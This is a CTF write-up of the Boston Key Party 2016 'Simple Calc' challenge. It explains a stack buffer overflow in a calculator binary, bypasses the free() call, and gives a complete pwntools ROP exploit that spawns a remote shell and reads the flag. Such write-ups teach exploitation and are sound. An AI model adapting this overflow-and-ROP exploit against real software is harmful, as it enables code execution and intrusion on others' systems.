---
layout: post
title: Boston Key Party CTF 2016 - Simple Calc
---

## Reversing

The calculator allows addition, subtraction, multiplication and division of numbers:

```

        |#------------------------------------#|
        |         Something Calculator         |
        |#------------------------------------#|

Expected number of calculations: 4
Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 1234
Integer y: 4321
Result for x + y is 5555.
```

The user is asked for an expected number of calculations which is used for allocation of a buffer on the heap. The results of the calculations are stored in this buffer.
When using the `Save and Exit` option, the results are copied from the buffer to another buffer located on the stack using a `memcpy`:

```
0x40152E    mov     eax, [rbp+no_of_calcs]
0x401531    shl     eax, 2
0x401534    movsxd  rdx, eax
0x401537    mov     rcx, [rbp+heap_results]
0x40153B    lea     rax, [rbp+stack_results]
0x40153F    mov     rsi, rcx
0x401542    mov     rdi, rax
0x401545    call    memcpy
0x40154A    mov     rax, [rbp+heap_results]
0x40154E    mov     rdi, rax
0x401551    call    free
```

### Vulnerability

The problem is that the stack-based buffer only has room for 11 x 32-bit integers which results in a stack-based buffer overflow when having more than 11 calculations. The stack layout is given below:

```
-0x50 var_50          dq ?
-0x48 var_48          dd ?
-0x44 var_44          dd ?
-0x40 stack_results   dd 11 dup(?)
-0x14 no_of_calcs     dd ?
-0x10 heap_results    dq ?
-0x08 var_8           dq ?
+0x00 saved rbp       db 8 dup(?)
+0x08 return address  db 8 dup(?)
```

To get RIP control we want to overflow the return address without messing things up too much. In order to do this, we need to be careful when overwriting the local variables between `stack_results` and the return address. In particular, `free` could crash the program if the passed `heap_results` pointer is not valid. 

Looking at the implementation for `free` in the statically linked binary, we see that the function returns early if a NULL pointer is passed as argument: 

```
                              |
                      =--------------------=
                      |  0x4156e0          |
                      | test rdi, rdi      |
                      | je 0x415798 ;[Bk]  |
                      =--------------------=
                            t f
          .-----------------' '-----------------.
          |                                     |
          |                                     |
    =----------------=                  =--------------------------=
    |  0x415798      |                  |  0x4156e9                |
    | ret            |                  | mov rax, qword [rdi - 8] |
    =----------------=                  | lea rsi, [rdi - 0x10]    |
                                        | test al, 2               |
                                        | jne 0x415718 ;[Bl]       |
                                        =--------------------------=
```

We abuse this to make sure that `free` doesn't make the program crash before the overwritten return address is executed.

## Exploitation

Overwriting `heap_results` as NULL allows us to overwrite the return address and get RIP and stack control. Inspecting the binary using `checksec` we see that the stack is not executable:

```
    RELRO:         Partial RELRO
    Stack Canary:  No canary found
    NX:            NX enabled
    PIE:           No PIE
```

To get code execution we construct a ROP chain to make syscall to `execve("/bin/sh",NULL,NULL)`. As the binary is statically linked we have a lot of gadgets, and we can easily pop arbitrary values into most registers. Furthermore, we have a write-what-where gadget we can use to write memory:

```
0x000000000044526e : mov qword ptr [rax], rdx
```

### Exploit

The exploit makes use of a ROP chain to write `/bin/sh\x00` to a writeable location in memory using the write-what-where gadget, loads `rdi` with the string pointer, resets registers `rdx` and `rsi`, and finally makes the syscall. When the option `Save and Exit` is chosen, the program will give us a shell on the remote system.

{% highlight python %}
#!/usr/bin/env python2
from pwn import *
from pwnlib.constants import *

#######################################
# Init
#######################################

LOCAL = not args["REMOTE"]
GDB = args["GDB"]
QIRA = args["QIRA"]

context(arch = "amd64", os = "linux")
#context.log_level = "debug"

if QIRA:
    p = remote("localhost",4000)
elif LOCAL:
    p = process("./b28b103ea5f1171553554f0127696a18c6d2dcf7")
    if GDB:
        gdb.attach(p,"""
        b *0x401589
        c
        """)
else:
    p = remote("simplecalc.bostonkey.party", 5400)

#######################################
# Helper functions
#######################################

def send32(data):
    """Use addition to store data on the stack"""
    assert len(data) == 4
    p.sendline("1")

    # Program doesn't allow us to calculate the sum of small
    # numbers. But we need to be able to get a sum of 0
    # for heap_results - so we force integer overflow
    p.recvuntil(": ")
    p.sendline(str(0x7FFFFFFFFFFFFFFF-0xFFFF))
    p.recvuntil(": ")
    p.sendline(str(u32(data)+0xFFFF+1))
    
    p.recvuntil("=> ")


def send64(data):
    """Wrapper for 2 x send32()"""
    assert len(data) == 8
    send32(data[:4])
    send32(data[4:])

#######################################
# Prepare for overflow
#######################################

# Receive menu

p.recvuntil(": ")
p.sendline("255")
p.recvuntil("=> ")

# Fill stack until ret addr

log.info("Filling stack")

for i in xrange(18):
    if i == 12 or i == 13:
        # Overwrite heap_results pointer
        send32(p32(0x0))
    else:
        send32(p32(0xaabbccdd))

######################################################
# ROP chain for syscall execve("/bin/sh", NULL, NULL)
######################################################

"""
0x000000000044db34 : pop rax ; ret
0x0000000000437a85 : pop rdx ; ret
0x0000000000401c87 : pop rsi ; ret
0x0000000000401b73 : pop rdi ; ret
0x000000000044526e : mov qword ptr [rax], rdx
0x00000000004648e5 : syscall ; ret
"""

pop_rax =       0x44db34
pop_rdx =       0x437a85
pop_rsi =       0x401c87
pop_rdi =       0x401b73
www_rax_rdx =   0x44526e
syscall =       0x4648e5
writable =      0x6c0000
bin_sh =        "/bin/sh\x00"

log.info("Sending ROP chain")

# write "/bin/sh" to some writable location
send64(p64(pop_rax))
send64(p64(writable))
send64(p64(pop_rdx))
send64(bin_sh)
send64(p64(www_rax_rdx))

# rdi = writable location
send64(p64(pop_rdi))
send64(p64(writable))

# rdx = 0x0
send64(p64(pop_rdx))
send64(p64(0x0))

# rsi = 0x0
send64(p64(pop_rsi))
send64(p64(0x0))

# rax = 0x3b
send64(p64(pop_rax))
send64(p64(0x3b))

# syscall
send64(p64(syscall))

######################################################
# Trigger overflow and get shell
######################################################

log.info("Triggering overflow")
p.sendline("5")
log.success("Got shell")
p.interactive()
{% endhighlight %}

Running the script against the remote server takes a few seconds and gives us a shell:

```
vagrant@pwnmachine:~/ctf/bkp/simple-calc$ ./exploit.py REMOTE=1
[+] Opening connection to simplecalc.bostonkey.party on port 5400: Done
[*] Filling stack
[*] Sending ROP chain
[*] Triggering overflow
[+] Got shell
[*] Switching to interactive mode
$ ls
key
run.sh
simpleCalc
simpleCalc_v2
socat_1.7.2.3-1_amd64.deb
$ cat key
BKPCTF{what_is_2015_minus_7547}
$
```
